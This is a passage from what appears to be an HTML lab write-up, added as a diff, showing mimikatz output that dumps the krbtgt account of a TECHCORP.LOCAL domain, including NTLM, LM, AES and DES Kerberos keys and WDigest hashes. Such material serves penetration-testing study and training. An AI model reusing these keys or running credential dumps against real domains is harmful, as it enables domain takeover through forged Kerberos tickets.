+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 7/4/2019 1:52:52 AM
+Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 7735b8be1edda5deea6bfbacb7f2c3e7
+    ntlm- 0: 7735b8be1edda5deea6bfbacb7f2c3e7
+    lm  - 0: 295fa3fef874b54f29fd097c204220f0
+
+Supplemental Credentials:
+* Primary:NTLM-Strong-NTOWF *
+    Random Value : 9fe386f0ebd8045b1826f80e3af94aed
+
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : TECHCORP.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 290ab2e5a0592c76b7fcc5612ab489e9663e39d2b2306e053c8b09df39afae52
+      aes128_hmac       (4096) : ac670a0db8f81733cdc7ea839187d024
+      des_cbc_md5       (4096) : 977526ab75ea8691
+
+* Primary:Kerberos *
+    Default Salt : TECHCORP.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 977526ab75ea8691
+
+* Packages *
+    NTLM-Strong-NTOWF
+
+* Primary:WDigest *
+    01  3d5588c6c4680d76d2ba077526f32a5f
+    02  fe1ac8183d11d4585d423a0ef1e21354
+    03  eed2a6a9af2e107cdd5e722faf9ed37a
+    04  3d5588c6c4680d76d2ba077526f32a5f
+    05  fe1ac8183d11d4585d423a0ef1e21354
+    06  a5a3b7dd758f68b0a278704adb369bab
+    07  3d5588c6c4680d76d2ba077526f32a5f
+    08  0ef30f135647c7c486081630caf708da
+    09  0ef30f135647c7c486081630caf708da
+    10  65974a65a535c47de5c6b6712ffa5c8d
+    11  fe790227e59a7b92b642884eacb84841
+    12  0ef30f135647c7c486081630caf708da
+    13  3c5a73e8774f215ffdd890f5e6346a05
+    14  fe790227e59a7b92b642884eacb84841
+    15  752720442d3f869baff615ae37a01d64
+    16  752720442d3f869baff615ae37a01d64
+    17  994c18bfe477093681c6b1d60ca56ac9
+    18  5fdbdb1b61e0717ba72b31741ae7ea19
+    19  535375d7fc7b3ec068521ac5ab6680d4
+    20  64d869a620dced95df997d91c5c2ecda
+    21  16b97c2628a32cb876ede8bb4e6d5253
+    22  16b97c2628a32cb876ede8bb4e6d5253
+    23  eca0357ae57e1df149e2d016494173c9
+    24  6e22a7980efe7c6bf44f821ea902d209
+    25  6e22a7980efe7c6bf44f821ea902d209
+    26  bfd73a5e0a64a9c334d1108004a98be5
+    27  e55f4d4f79067737d4a95f11fdce1a13
+    28  0141dc3481204f4334a0cb4cf6be2067
+    29  8b31e2cda5a9dd5d728f55f44dc8e7ea
+
+
+mimikatz(commandline) # exit
+Bye!</code></pre>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
